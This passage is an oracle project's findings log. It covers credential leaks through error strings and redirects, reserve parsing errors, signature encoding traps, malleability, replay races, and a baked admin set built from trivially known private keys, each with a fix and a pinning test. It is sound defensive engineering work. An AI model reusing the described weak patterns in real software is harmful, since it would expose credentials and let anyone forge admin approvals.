# USDX Oracle — Implementation Findings

**Status:** living document · **Last updated:** 2026-10-02

> **The move to upstream's contracts (2026-08).** The on-chain half moved from
> this repository's `UsdxPriceStore`, `UsdxCustomFeed` and instruction sender to
> upstream's generic TEE oracle contracts: `TeeOracleInstructionsSender` and
> `TeeOracleFeedStore`, with signatures verified by `Fdc2Verification`. Findings
> written before then describe the old contracts, the `GET_PRICE` command and the
> per-machine configuration hash as they were; where the move changed a
> resolution, the finding says what holds now. The current model is described in
> [usdx-oracle-flows.md](usdx-oracle-flows.md).

Findings discovered while implementing the extension, each with the evidence
that established it and what now pins it. Design intent lives in
`usdx-oracle-spec.md`; this file records what turned out to be true in practice,
especially where it differs from, or sharpens, the spec.

Each finding with a defect behind it is pinned by a named test, in this
repository or in upstream's suite (`flare-smart-contracts-v2/test-forge`), so if
a finding is ever wrong, or tee-node or the contracts change underneath it, a
test fails rather than a price being quietly mispublished. The informational
findings record decisions and name what carries them.

| # | Finding | Severity | Pinned by |
| --- | --- | --- | --- |
| 1 | `ActionResult.Log` is public and raw Go errors leak secrets into it | **High** | `internal/failure` (whole package); `TestVocabularyIsPublishable`, `TestProcessGetFeed_ForeignErrorIsNotPublished` |
| 2 | A redirect can hand the Hex API key to a third party | **High** | `TestFetch_DoesNotFollowRedirects` |
| 3 | Blind comma-stripping overstates reserves 100× | **High** | `TestParseAmount_LocaleCommaIsNotSilentlyStripped` |
| 4 | tee-node returns `v` as 0/1; OpenZeppelin requires 27/28 | **High** | `TestClaim1_TeeNodeReturnsRecoveryIDNotV`, `TestSplitSignatureRequiresNormalisedV` |
| 5 | tee-node applies EIP-191; verifying the bare hash silently misrecovers | **High** | `TestClaim2_MustRecoverAgainstPrefixedHash`, `TestSigningMessageIsThePreimage` |
| 6 | Truncation was chosen so rounding could not report full backing for an under-backed token — reversed by 21 | **Medium** | `TestCompute_RoundingCannotHideAMaterialShortfall`, `TestCompute_RoundingBoundaryIsExact` |
| 7 | The sign wire is base64, not hex | **Medium** | `TestClaim3_WireIsBase64NotHex`, `TestWireFormatMatchesTeeNode` |
| 8 | An empty `sourceHealth` map reads as healthy | **Low** | `TestObserve_HealthSeededForEverySource` |
| 9 | ~~The TEE machine status enum's numeric values are not published~~ **RESOLVED** | **High** | upstream `Fdc2Verification`: `testVerifyTeeSignatureWithExtensionIdRevertTeeMachineNotAvailable`, `testThresholdFlowRejectsDemotedMachine` |
| 10 | secp256k1 malleability gives one report two valid signatures | **Medium** | upstream `Fdc2Verification` recovers with OpenZeppelin `ECDSA.recover`, which rejects high `s`; no test asserts it on this path |
| 11 | A `TeeExtensionStateVerifier` is not required — briefly was, while the state had content (2026-09) | Info | conformance fixture `12-get-state` (`TestConformance`); `wire-extension` publishes the zero verifier |
| 12 | ~~The production entrypoint lands in stub mode silently~~ **RESOLVED** | **High** | `TestNilObserverPanics` |
| 13 | The deployment ordering has no circularity | Info | the deploy flow in §13 |
| 14 | Configuration arrives at runtime; only the un-substitutable parts stay baked | Info | the tests named under §14's properties |
| 15 | The governance key can set any RPC host and any threshold — accepted | **High** | `TestAnyHostIsAccepted` |
| 16 | On-chain config recorded what was *sent*, not what a machine *runs* | **High** | upstream `testSubmitFeedUpdatesOneSignatureRevertStaleEndpoints`, `testPublicationInvalidatesMachinesUntilTheyAdoptIt`; `TestApply_HashesThePayloadAsReceived` |
| 17 | Full audit of every logging and error surface found no sensitive disclosure | Info | §17 audit + the finding-1 tests |
| 18 | The report's target binding was removed pre-launch — superseded: the update binds chain, extension and feed | Info | `TestChainIDIsBound`, `TestFeedBindingIsInTheDigest`; upstream `testSubmitFeedUpdatesOneSignatureRevertWrongFeedId` |
| 19 | Concurrent provisioning bypassed the envelope replay defence entirely | **High** | `TestApplySecret_ConcurrentReplayAdmitsExactlyOne` |
| 20 | The publisher could redirect the Hex API key into a URL of their choosing | **High** | `TestSetEndpoints_RejectsBackingCredentialAsProviderSecret` |
| 21 | Truncation froze the feed below par on a rounding artifact | **Medium** | `TestCompute_RoundsHalfUp`, `TestComputeWithoutCash_MatchesTheFullComputation` |
| 22 | `requestPriceUpdate()` could never dispatch: the registry rejects an empty message | **High** | `TestProcessGetFeed_RequiresTheRequestEnvelope` |
| 23 | An observation cannot fit in the 2 seconds tee-node allows | **High** | `TestReport_SignsTheCachedObservation`, `TestReport_DoesNotSignAStaleObservation` |
| 24 | One RPC provider could rewind the observation to an old block | **High** | `TestRead_OneProviderCannotRewindTheObservation`, `TestRead_OverclaimedHeadDoesNotDenyTheRound` |
| 25 | Verification proved a key nothing was encrypted to | **High** | `TestBuildRefusesAKeyThatIsNotTheAttestedMachine` |
| 26 | `SET_SECRET` was the one provisioning command with no size bound | **Medium** | `TestApplySecret_RejectsOversizedMessage` |

---

## 1. `ActionResult.Log` is a public surface, and raw errors leak into it

**Severity: High.** Publishes credentials and reserve figures.

Spec §4.1 establishes that `GET /state` is world-readable. `ActionResult.Log` is
a *second* surface with the same exposure and is not called out: it is part of
the wire contract (`extension-contract.md` §4.6, `"error: <message>"` for
status 0), returned to the TEE proxy, and served from its action-result
endpoint.

Go error strings routinely carry exactly what must not appear there. Both of
these were reproduced, not theorised:

```
1. http    -> Get "https://api.htdigitalassets.com/...?apikey=SUPER_SECRET_KEY": dial tcp: ...
2. decimal -> parsing reserves "25,452,544.52": not a decimal
```

The first is `*url.Error`, which embeds the full request URL including any
query-string credential. The second is the sharper one: it embeds **the reserve
figure**, which §4.1 excludes from every public surface. And because Hex's
public endpoint really does return comma-separated values, a naive
`fmt.Errorf("parsing %q: %w", raw, err)` would publish that number on a
predictable, frequently-taken path — not a rare edge case.

**Resolution.** `internal/failure` owns the complete public error vocabulary.
`Failure` has unexported fields and no exported constructor, so a `Failure` can
only be one of the package-level values declared in that one file. Putting a
runtime value into a public error string is a compile error, not a review
finding. A handler refuses with `refuse(failure.X)`, whose argument is a
`Failure`, never an `error`, and an error from anywhere else is mapped onto the
vocabulary at the boundary with `failure.Coerce`, which falls back to a generic
value.

Tests reject any digit, quote, URL, hostname, or credential-word in the
vocabulary, so a careless addition fails CI (`TestVocabularyIsPublishable`).
`TestProcessGetFeed_ForeignErrorIsNotPublished` injects a
`dial tcp …?apikey=SECRET` error into the feed path and requires the public
result to read `error: internal error`.

**Consequence for logging.** The detail still matters for debugging, but §4.1
leaves *where Confidential Space logs land and who can read them* unresolved.
Until that is answered, internal logs carry the error class, the source
identifier, and HTTP status only — never the upstream error, the response body,
or any parsed figure. This matches the spec's own instruction to "log the
derived price and error classes only".

---

## 2. A redirect can hand the Hex API key to a third party

**Severity: High.** Discloses the credential that gates the private endpoint.

Go's `http.Client` strips `Authorization` on a cross-host redirect. It does
**not** strip custom headers. WP1 records that the private endpoint's auth
scheme is unconfirmed — it returns 404 rather than 401 without credentials, so
bearer vs `X-API-Key` cannot be distinguished until a key is issued. If it turns
out to be `X-API-Key`, then any upstream able to return a `302` — a compromised
Hex, a hijacked DNS entry, a misconfiguration — receives the key.

**Resolution.** `backing.New()` sets `CheckRedirect` to
`http.ErrUseLastResponse`, disabling redirect-following outright. An API client
has no legitimate reason to follow one. `TestFetch_DoesNotFollowRedirects`
stands up a sink server behind a redirect and asserts the key never arrives.

Related hardening in the same constructor, each with a test:

- **https is required.** Plaintext would expose the key on the wire and let
  anyone on path dictate the reserve figure, and therefore the published price.
- **Source names may not look like URLs.** Names reach the readiness report's
  `sourceHealth`, which is public; a URL-shaped name would disclose the endpoint
  and any embedded key.
- **Response bodies are size-capped** at 64 KiB via `io.LimitReader`.

---

## 3. Blind comma-stripping overstates reserves one hundredfold

**Severity: High.** Would mask the depeg the oracle exists to detect.

Spec §WP1 flags the separator difference and warns against blind stripping. The
magnitude is worth stating explicitly, because it determines how the parser must
be written rather than merely how carefully.

Measured 31 Jul 2026, the two endpoints disagree on format:

```
public:  {"value":"25,452,544.52"}   commas, no currency field
private: {"value":"205304.47"}       no commas, currency: "USD"
```

The obvious implementation — delete every comma, then parse — is wrong.
Comma-as-decimal-separator is a real convention: much of Europe writes `1,50`
for one and a half. Stripping turns that into `150`. A hundredfold
overstatement of reserves publishes $1.00 straight through a genuine depeg.

**Resolution.** `internal/observation/decimal` validates grouping structure rather than
deleting characters: a comma is accepted only where a thousands separator can
legally appear (leading group of 1–3 digits, every subsequent group exactly 3).
`1,50` is rejected. Fail closed; never guess what the operator meant.

Also rejected, because `big.Rat.SetString` accepts them and none is a valid
amount: `1/2` (fraction syntax), `1e5` (exponent), signs, whitespace, and
anything over 64 characters.

Amounts parse to `*big.Rat` — exact. Deliberately **not** `shopspring/decimal`:
for an extension whose value proposition is a reproducible, auditable code hash,
a third-party dependency carrying its own rounding semantics is one more thing
an auditor must read and one more thing that can shift under a version bump.
`big.Rat` is covered by the Go compatibility promise. 5.9M fuzz executions, no
failures.

---

## 4. tee-node returns `v` as 0/1; OpenZeppelin requires 27/28

**Severity: High.** Every on-chain verification fails, and the failure misleads.

Verified against `tee-node v0.0.21-0.20260619120252-31fc839ae6d2`, the version
then pinned in `go.mod` — not against the spec's summary — and re-verified
against `v0.0.27-0.20260914073453-9c6bc46a5ee6`, the version pinned now. The
call chain is unchanged:

```go
// internal/extension/server/server.go — signWithTeeHandler
msgHash := crypto.Keccak256(signRequest.Message)
signature, err := s.node.Sign(msgHash)

// pkg/utils/crypto.go — Sign
sig, err := crypto.Sign(accounts.TextHash(msgHash), privKey)
```

`crypto.Sign` returns a 65-byte signature whose final byte is a **recovery id of
0 or 1**, per go-ethereum convention. `ecrecover` and OpenZeppelin's
`ECDSA.recover` both require **27 or 28**, and OZ rejects anything else with
`ECDSAInvalidSignature`.

Exactly one side must add 27. If both do, or neither does, every signature
fails.

**Confirmed empirically, not by reading.** `TestClaim1_TeeNodeReturnsRecoveryIDNotV`
reproduces tee-node's exact call chain over 200 messages and asserts the final
byte is always 0 or 1, and that **both** values occur — a single sample could be
0 or 1 by luck and would prove nothing.

**Decision: normalise on the extension side.** `teenode.NormalizeV` adds 27
before the signature leaves the enclave.

Rationale at the time: it kept `UsdxPriceStore` using stock, unmodified
OpenZeppelin — the version an auditor already knows how to read — rather than a
local variant with a `+27` an auditor must reason about. Since the move to
upstream's contracts the choice is no longer ours to make: `Fdc2Verification`
recovers with OpenZeppelin's `ECDSA.recover`, unmodified, so the enclave must send
27/28, and `feedupdate.SplitSignature` refuses a raw recovery id rather than
paper over one (`TestSplitSignatureRequiresNormalisedV`). The cost is that the
published signature is not byte-identical to what `POST /sign` returned, which is
recorded in the payload documentation. `NormalizeV` is idempotent (27/28 passes
through unchanged), so double-application is safe, and it does not mutate its
input.

**Status when found:** consistent. The extension did not call `/sign` yet — the
price handler still returned the stubbed $1.00 — so nothing was wrong and nothing
needed correcting. The normalisation was in place *before* the signing path was
wired, which is the point: this trap is cheap to prevent early and expensive to
diagnose later, because it surfaces on-chain as a rejected signature rather than
as an encoding bug. Every feed update now goes through `teenode.Client.Sign`,
which normalises.

---

## 5. tee-node applies EIP-191; verifying the bare hash misrecovers silently

**Severity: High.** Fails in a way that sends an investigator to the wrong place.

From the same source chain: `accounts.TextHash(msgHash)` prepends
`"\x19Ethereum Signed Message:\n32"` before hashing. The digest actually signed
is therefore:

```
keccak256("\x19Ethereum Signed Message:\n32" ‖ keccak256(message))
```

So a verifier must recover against `toEthSignedMessageHash(keccak256(message))`,
**not** against `keccak256(message)`. For a feed update the message is the
`SignedPayload` preimage `abi.encode(bytes32("TEE_ORACLE_FEED"), chainId,
dataHash)`, and upstream's `Fdc2Verification` recovers over
`toEthSignedMessageHash(messageHash)`. The enclave must therefore hand the signer
that preimage, never its hash (`TestSigningMessageIsThePreimage`,
`TestDigestMatchesSolidity`).

The danger is the failure mode, not the mistake. Recovering against the bare
hash **does not revert** — it returns a well-formed but different address. On
chain that presents as "this TEE is not registered", sending whoever
investigates to the machine registry and the registration flow rather than to
the hashing. `TestClaim2_MustRecoverAgainstPrefixedHash` asserts both that the
prefixed recovery yields the right address and that the unprefixed one does not.

`TestSignedReportRecoversAfterNormalisation` covers findings 4 and 5 together:
sign the way tee-node does, normalise, then recover the way the contract will.

---

## 6. Truncation is load-bearing, not a style choice

> **⚠ Reversed 5 Aug 2026 — the price now rounds half-up. See finding 21.** The
> reasoning below is why truncation was chosen and is still why the *bound*
> matters; what changed is the measurement that the bound was traded against.
> `TestCompute_TruncatesNeverRounds` is now
> `TestCompute_RoundsHalfUp` plus `TestCompute_RoundingCannotHideAMaterialShortfall`.

**Severity: Medium.** Reports full backing for a token that is not fully backed.

Spec §3.5 specifies rounding down. The reason deserves recording: at 8 decimals,
a backing ratio of `0.999999995` **rounds** to exactly `1.00000000`. That
publishes "fully backed" for a token that is not, which is precisely the
condition the feed exists to surface.

Truncation makes every representable error conservative — the published price is
understated by at most one unit in the last place, never overstated.
`TestCompute_RoundingBoundaryIsExact` uses that exact value.

The par cap is the mirror image: USDX redeems at $1.00, so over-collateralisation
does not make it worth more, and publishing 1.02 would be wrong in a way that
costs someone money. Both properties are fuzzed as invariants over arbitrary
inputs (5.2M executions): the result is never negative and never exceeds par.

`internal/observation/price` is kept **pure** — no I/O, no clock, no configuration, no
policy — which is what makes that fuzzing meaningful and lets an auditor verify
the formula by reading alone. There is no plausibility band anywhere (see *No
price band* under the design decisions), and a deviation guard, if one is
adopted, belongs on-chain; encoding either here would hide a governance
parameter inside arithmetic.

---

## 7. The sign wire is base64, not hex

**Severity: Medium.** Silent misencoding.

`tee-node`'s `SignRequest.Message`, `SignResponse.Signature`,
`DecryptRequest.EncryptedMessage` and `DecryptResponse.DecryptedMessage` are all
Go `[]byte`, and `encoding/json` renders `[]byte` as **base64**. Every other
byte string in FCC is hex, so this is a genuine asymmetry rather than a
convention one can infer.

`TestClaim3_WireIsBase64NotHex` asserts the encoding, and
`TestWireFormatMatchesTeeNode` marshals our locally declared structs alongside
tee-node's and requires byte-identical JSON — so a change on their side breaks a
test rather than the feed.

---

## 8. An empty `sourceHealth` map reads as healthy

**Severity: Low.** Hides a source that silently stopped being polled.

`GET /state` reported `sourceHealth` as a map of source identifier to status (it
is now in the signed `GET_READINESS` report). With no entries it serialises as
`{}`, which is indistinguishable from "all sources fine" to anyone eyeballing
it — and once sources exist, an *absent* key would read the same way.

**Resolution.** `types.HealthUnknown` (`pkg/types`) is an explicit value, and
`newHealth` seeds every known source with it at the start of each observation, so
absence is never mistaken for health; the cash source is seeded as
`not_configured` when it is not provisioned (`TestObserve_HealthSeededForEverySource`).
Names are identifiers (`hex_bonds`, `rpc_flare_1`), never URLs, for the
disclosure reason in finding 2.

**Granularity, since decided: both.** The natural key is per-chain, but the
design reads several RPC providers per chain with quorum agreement, so
`rpc_flare: "ok"` hides one provider being down — exactly the state worth seeing
*before* the next one goes and quorum fails. The map carries the per-chain key
and positional per-provider keys (`rpc_flare_1`, `rpc_flare_2`, …), each `ok`,
`down`, `disagree` or `lagging`. The provider count this discloses is public on
chain anyway, in the `SET_ENDPOINTS` payload, and positional names mean nothing a
payload author writes reaches the report.

---

## 9. The TEE machine status enum's values are not published

**Severity: High.** Blocks correct mainnet deployment. **Resolved.**

`UsdxPriceStore` had to reject a signer that is registered to this extension but
has since been revoked. `MachineManager` exposes
`getTeeMachineStatus(address) -> uint8`, but the ABI types the return as a bare
`uint8`: the enum's member names and numeric values do not survive into the
published Go bindings, and nothing in this repo or `go-flare-common` recorded
them.

Guessing is worse than either outcome it produces. Guess too low and revoked
machines keep publishing prices indefinitely. Guess too high and every
submission reverts, which is a total feed outage that would only be discovered
after deployment.

**RESOLVED.** Read from source —
`flare-smart-contracts-v2/contracts/userInterfaces/tee/IMachineManager.sol`:

```solidity
enum TeeStatus { NONE, INITIALIZED, PRODUCTION, SUSPENDED, PAUSED, BANNED }
```

So `PRODUCTION == 2`. Confirmed independently on Coston2: the live machine
`0x2ab1a473…` reports status 2 and appears in `getActiveTeeMachines(0x10193)`.

The enum was restated on `ITeeMachineRegistry` and `REQUIRED_TEE_STATUS` became
the constant `uint8(TeeStatus.PRODUCTION)` rather than a constructor parameter.
Only one value is ever correct, so a parameter was a footgun — and it fired: the
Coston2 store was deployed with `1`, which is `INITIALIZED`, meaning it rejected
every production machine while accepting one that registered but was never
promoted via `toProduction()`.

**Note for the deployment checklist:** the earlier reading of the spec prose
(`docs`, "Machine statuses") put `paused` at 1. That ordering does not match the
enum. Trust the source, not the prose.

`NONE == 0` also answers the sub-question about unknown machines: a machine that
was never registered reports `NONE`, so the status comparison alone rejects a
stranger, independently of the `getExtensionId` check.

**Current.** The check is upstream's. `Fdc2Verification` requires
`getTeeMachineStatus(signer) == TeeStatus.PRODUCTION` and `getExtensionId(signer)`
equal to the store's extension, so the constant, and the store that held it, are
gone. Pinned upstream by
`testVerifyTeeSignatureWithExtensionIdRevertTeeMachineNotAvailable`
(`test-forge/unit/fdc2/implementation/Fdc2Verification.t.sol`) and by
`testThresholdFlowRejectsDemotedMachine` (`test-forge/integration/TeeOracle.t.sol`),
which runs the real `Fdc2Verification`.

---

## 10. secp256k1 malleability gives one report two valid signatures

**Severity: Medium.** Breaks "one report, one signature" for anything keying off
signature bytes.

For any valid `(r, s, v)` there is an equally valid `(r, n − s, v ^ 1)` that
recovers the same signer. An observer who sees a submitted report can therefore
mint a second, byte-distinct signature for it without any key material.

Strict `observedAt` monotonicity already makes a replay harmless *in this
contract* — the second submission is rejected as not-newer regardless. But the
property is worth enforcing rather than relying on: a keeper deduplicating by
signature hash, or any future consumer that treats the signature as an
identifier, would be wrong in a way that is hard to see.

**Resolution.** `UsdxPriceStore._recover` rejected the high-`s` form outright,
the same rule OpenZeppelin applies. One accepted representation means one code
path to audit.

**Current.** `UsdxPriceStore` and its `_recover` are gone. Upstream's
`Fdc2Verification` recovers with OpenZeppelin's `ECDSA.recover`, which reverts
with `ECDSAInvalidSignatureS` on the high-`s` form, so the property holds on the
feed path. No test in this repository or in upstream's suite asserts it there;
the nearest upstream test is `test_relay_highS_reverts`
(`test-forge/unit/protocol/implementation/Relay.t.sol`), which pins the Relay's
own check. On the enclave's side, `eip191.Recover` — which verifies provisioning
envelopes — rejects high `s` through go-ethereum's `ValidateSignatureValues`,
likewise without a dedicated test.

---

## 11. A `TeeExtensionStateVerifier` is not required

**Severity: informational.** Removes a planned work item.

Spec §WP4.3 lists "`TeeExtensionStateVerifier` — required by `register()`;
scaffold has none" as a task. Observed behaviour contradicts it:
`tools/cmd/register-extension/main.go` passed `common.Address{}` as the state
verifier and registration succeeded — the scaffold's whole end-to-end flow ran
that way.

A state verifier exists to validate the extension's attested `GET /state`
on-chain. This design does not need one: the price reaches the chain through the
signed-update path into the feed store, and nothing on-chain consumes the state.

**No contract was written.** If a future design wants attested state on-chain,
this decision should be revisited — but building one now would be unused code in
an audited codebase.

**Revisited 2026-09-09.** tee-node now reports the extension's `GET /state` in the
TEE info it attests, and the registry's availability check accepts a non-empty
state only through a registered verifier (`_validateResponseBody` in upstream's
`Verification.sol`). So a verifier became required after all, not to consume the
state but to let machines pass `toProduction` and `confirmAvailability`.
A minimal verifier was written and published with `setExtensionContracts`: it
refused tee-node's "could not read the extension" sentinel and a malformed report
(version without bytes, or bytes without version), accepted everything else, and
parsed nothing.

**Revisited 2026-09-16, and the original finding stands.** The extension now
answers `GET /state` with the empty state, because its account of itself is the
signed `GET_READINESS` report. With no verifier registered, the availability
check accepts a zero version with no bytes and refuses everything else, which
covers the sentinel too — strictly more than the verifier refused. The contract,
its deploy script and its test are removed, and `wire-extension` publishes the
zero address. Conformance fixture `12-get-state` pins the empty state.

---

## 12. The production entrypoint still serves a hard-coded price

**Severity: High.** **Resolved 2026-08-03.**

Found by auditing the call graph rather than by a failing test, which is why it
is worth recording: every check was green while this was true.

    cmd/extension-tee/main.go
      -> extserver.StartExtension(port, signPort)
      -> extension.New(extensionPort, signPort)
      -> NewWithObserver(..., nil)          // observer == nil
      -> stub mode

Nothing anywhere constructed an `oracle.Runner`. The observation path was
complete and tested, but no code assembled it, because that needed configuration
which did not exist yet: RPC endpoints per chain, Hex endpoint URLs, injected
credentials, the store address, the feed id. There was no config loader.

The reason this is High rather than a to-do: **a hard-coded par price is the one
failure mode that raises no alarm.** No error, no failure counter, no stale
timestamp, no unhealthy source. A feed frozen at exactly $1.00 is
indistinguishable from a healthy, fully-backed one — precisely the state the
monitoring in WP7 is designed to detect, and precisely the state it cannot see.

**Resolution.** Three changes, in order of how much they matter:

1. **`extension.New()` was deleted.** That constructor was the actual defect: it
   read as the ordinary way to build an extension while silently producing a
   stub.
2. **The process refuses to start rather than fall back.** At the time
   `server.StartExtension` loaded an embedded config and refused to start without
   it; there is no embedded configuration now. The process refuses to start
   without `CHAIN_ID`, `EXTENSION_ID` and a resolved TEE identity, boots
   unprovisioned, and every `GET_FEED` fails closed until endpoints and admin sets
   arrive. There is no
   fallback to a stub on any error — falling back would reintroduce the exact
   failure, just later.
3. **A nil observer is unconstructible.** An interim fix logged a six-line
   banner at `ERROR` level, but inside a TEE the logs cannot be read from
   outside, so a banner is not a defence. The one constructor,
   `extension.NewExtension`, **panics** on a nil observer
   (`TestNilObserverPanics`), and no stub constructor or stub binary exists.
   `./cmd/extension-tee` is production and is what `Dockerfile` builds.

**The conformance fixtures pin the production payload.** The stub binary and its
JSON wire format are gone. `TestConformance` replays the fixtures against the real
router with a fixed observation, so the `data` assertions are byte-exact
`abi.encode(FeedUpdate, Signature)` over that observation with a well-formed
constant signature (`internal/extension/conformance_test.go`). The earlier caveat
that the fixtures pinned the stub's format and gave less assurance than their
green result suggested no longer applies.

End-to-end runs are the local simulation ([local-e2e.md](local-e2e.md)) and the
testnet flows in [deploy/README.md](../deploy/README.md).

---

## 13. The deployment ordering has no circularity

**Severity: informational.** Corrects an error in an earlier draft of this
document.

The original concern: while the signed report bound the store address, the
store had to be pinned in the extension's embedded config — which appeared to
require the store before the image, while the store's constructor needs
`EXTENSION_ID`, which appeared to require a registered extension and therefore
a running TEE. That reasoning was wrong even then: **registering an extension
does not require a running TEE machine.** Only registering a *machine* does. The
scaffold's lifecycle already separated the two with a hook between them, and the
earlier two-phase-build proposal solved a problem that did not exist.

**The ordering now.** The image binds no contract address at all: the extension
and feed ids are inside the update, the chain id in its signed envelope, and the
store is found by the keeper from the addresses file. Nothing on chain has to
exist before the image is built, and one image serves any deployment it is
launched for. The flow separates the extension, its contracts and its machines:

    use-chain.sh <chain>                    the active .env for that chain
    deploy-oracle.sh --chain <chain>        sender + feed store for EXTENSION_ID, deployer-governed
                                            (upstream's deployments: import-upstream-addresses.sh instead)
    tools: wire-extension                   setExtensionContracts(extensionId, 0, sender);
                                            allowlist the machines' owner
    full-setup.sh                           start the services; post-build.sh: allow-tee-version,
                                            set-governance, register-tee
    publish-local.sh endpoints | admins     setEndpoints / setAdmins for the feed
    upload-hex-key.sh, upload-rpc-keys.sh   the credentials, by SET_SECRET

`deploy-oracle.sh` deploys under an id the deployer already owns — reserved by
governance's `registerReserved`, or by the simulation's own governance key — or,
for a deployer on the registry's extension-owner allowlist, under the public id
the registry will mint, which it records in `.env`. A recorded sender is reused
only when it was deployed for this `EXTENSION_ID` and is governed by this
deployer, because a new store resets the stored value and the `observedAt`
ratchet; `--refresh` forces a new deployment. `wire-extension` runs before
`post-build.sh`, because the availability check `register-tee` triggers is
dispatched through the sender it publishes.

---

## 14. Configuration arrives at runtime; only the un-substitutable parts stay baked

**Severity: informational.** Records a design change and the reasoning, since it
reverses an earlier implementation.

An earlier build embedded RPC endpoints in the image and read credentials from
`SECRETS_CIPHERTEXT` at startup. Both now arrive after boot:

| | Was | Now |
| --- | --- | --- |
| Endpoints | Embedded JSON, code-hash pinned | Governance's `setEndpoints(feedId, groups, claimBack)` on `TeeOracleInstructionsSender`, dispatched as `SET_ENDPOINTS` |
| Admin sets | Baked into the image | Governance's `setAdmins(feedId, roles, claimBack)`, dispatched as `SET_ADMINS` |
| Credentials | `SECRETS_CIPHERTEXT` env at startup | Direct `SET_SECRET`, M-of-N signed envelope |
| Cash URL | Compiled in | A salted commitment in `SET_ENDPOINTS`; the preimage by `SET_SECRET` |
| Lifetime | Immutable after startup | Memory-only, lost on restart |
| Rotation | Rebuild or restart | A new publication or envelope; no rebuild, no restart |

**Why endpoints go on-chain.** Publishing which RPC providers are read is the
point — it is what makes the data sources verifiable rather than merely
asserted.

**Why credentials go by direct instruction.** No gas, no permanent public record
of a ciphertext, instant rotation, and no secret-handling path in Solidity.

**What still had to stay baked**, because moving it would have made the
attestation meaningless:

- **The host allowlist** — *superseded, see §15*. Baked at this point because,
  without it, on-chain endpoint configuration is itself a substitution channel:
  whoever can set endpoints can point a chain at a server they control and
  dictate the price. It was later removed so providers can be rotated without a
  rebuild, and the resulting governance-key trust is accepted explicitly in §15.
- ~~**The admin signer set**~~ — *superseded*. It was baked at this point as the
  root of trust for provisioning. It is now published by governance's
  `setAdmins`, recorded per feed as `latestAdminsHash`, and enforced by the store
  against every signed update. Baking it bought nothing the governance key did
  not already have (see §15) and cost a rebuild per rotation; publishing it makes
  "who could provision this machine" answerable from the chain. See
  rationale §9.
- **The observation bounds** — the deadline, the window and `MaxObservationAge` —
  since widening them weakens the TOCTOU bound.
- **The bonds URL and both metric names.** The cash URL left the image for a
  governance commitment, so its restricted URL never appears on chain in the
  clear (rationale §10).

(The signed report's target binding was removed pre-launch and then superseded:
the update binds chain, extension and feed. See §18.)

### Properties worth knowing

**Each command is valid over exactly one channel, enforced not assumed.**
`SET_ENDPOINTS`, `SET_ADMINS` and `GET_FEED` are instruction-only: the first two
are authorised by the sender's `onlyGovernance` check, which a direct action
would bypass entirely, and `GET_FEED` over the direct channel would hand a signed
update to anyone holding the proxy key. `SET_SECRET` and `GET_READINESS` are
direct-only: a credential ciphertext has no business in permanent public storage.
The router checks `action.Data.Type` — which the scaffold's dispatch ignored
completely — and refuses a command on the wrong channel as `WrongActionType`
(`TestSetEndpoints_RejectedOverDirectChannel`, `TestSetAdmins_RejectedOverDirectChannel`,
`TestSetSecret_RejectedOverInstructionChannel`, `TestGetFeed_RejectedOverDirectChannel`).

**A published admin set is enforced end to end.** `setAdmins` records
`latestAdminsHash`, the extension commits to `adminsHash` inside the signed
update, and the store rejects any mismatch with `StaleAdmins`. Rotating admins
therefore invalidates every machine still on the previous set until it applies the
new one — the same self-announcing behaviour republishing endpoints has.

**Two signer sets, split by exposure rather than by importance.** The envelope's
ref selects the set: `hex_api_key` and `hex_cash_url` are authorised by `backing`
(1-of-N permitted), everything else by `providers` (2-of-N minimum). The asymmetry
is deliberate and worth restating plainly, because it looks backwards at first
glance — the *better-protected* credentials get the *weaker* threshold. The
reasoning is impact, not exposure: the bonds URL is pinned and the cash URL is
bound by governance's commitment, so a wrong backing value denies the cash read
rather than moving the price, whereas a provider credential is substituted into a
URL the publisher chooses. **If the cash URL ever stops being bound by a
commitment, or the bonds URL stops being pinned, `MinBackingThreshold` must go
back up.** The ref-to-set mapping is pinned in the build, never in the payload;
otherwise the 1-of-1 key could claim the provider credentials.

**One rejection reason for everything.** Bad signature, too few distinct signers,
unknown signer, stale `issuedAt`, replayed version, wrong `teeId`, wrong chain,
wrong domain, undecryptable ciphertext — all return
`failure.ProvisionRejected`. Distinguishing them would turn provisioning into an
oracle for probing the admin set, the freshness window, and which machine is
which. `TestVerify_AllRejectionsAreIndistinguishable` holds that line.

**`version` and `issuedAt` are complementary, not redundant.** `version` is
in-memory and blocks rolling a secret back while the process lives. `issuedAt`
(one hour) bounds replay without any state, so it holds wherever the version
counter has reset and the identity has not. In this build the two reset
together: tee-node shares the extension's process and generates its identity key
at every start, so an envelope captured before a restart names a `teeId` no
machine holds any more, and `issuedAt` keeps that from being the only bar.

**Distinct signers.** One compromised key signing M times must not satisfy an
M-of-N threshold; recovered addresses are deduplicated.
`TestVerify_RejectsDuplicateSignerReachingThreshold`.

**A rejected update leaves the working configuration in place.** A bad
`SET_ENDPOINTS` must not take a live feed down
(`TestSetEndpoints_RejectedPublicationKeepsPreviousSnapshot`).

### Design bug caught while building

`secretRef` was initially one field serving two purposes: substitution into a
`{secret}` URL placeholder, and the value of an auth header. Those are different
cases — the Hex private endpoint authenticates by header with no placeholder,
while a keyed RPC URL has a placeholder and no header — and one field could not
express both without validation rejecting one of the two real configurations.
Split into `URLSecretRef` and `AuthSecretRef`.

**Since superseded.** Endpoints carry one `SecretRef` again, which fills the URL
of a PUBLIC endpoint or names the provisioned URL of a PRIVATE one. The one
header credential, `hex_api_key`, is named by no endpoint: its ref is pinned in
`pkg/protocol` and the value is attached to the cash request by
`config.CashSource`. The split is enforced by pinning rather than by a field.

### Resolved: the baked placeholder admin set

The admin set used to be baked into the image, and the baked value was the
addresses of **private keys 1, 2 and 3**:

```
0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf   privkey 0x01
0x2B5AD5c4795c026514f8317c7a215E218DcCD6cF   privkey 0x02
0x6813Eb9362372EEF6200f3b1dbC3f819671cBA69   privkey 0x03
```

Those are the most widely known keys in existence, so anyone could produce two
valid admin signatures, and the M-of-N threshold provided no protection whatever.
`TestAdminSetIsNotPlaceholder` skipped with a warning and was to become a hard
failure once real keys were baked.

The fix was not to bake different keys. The sets are now **published per feed**
by governance's `setAdmins` and dispatched to the extension's active machines,
and a verifier starts with none — `TestVerify_RejectsBeforeAnyAdminSetIsInstalled`
holds that line. A machine that has not been told who its admins are cannot be
provisioned at all, so there is no longer a guessable default to be wrong about.
The same addresses survive as an explicitly named test fixture,
`deploy/config/admins/dev-wellknown-keys.json`, which is inert unless someone
deliberately publishes it.

`TestAdminSetIsNotPlaceholder` is gone with the constant it guarded.

**Corrected 5 Aug 2026.** This section previously described the placeholders as
`0x1111…`, `0x2222…`, `0x3333…`. They were not, and the old wording understated
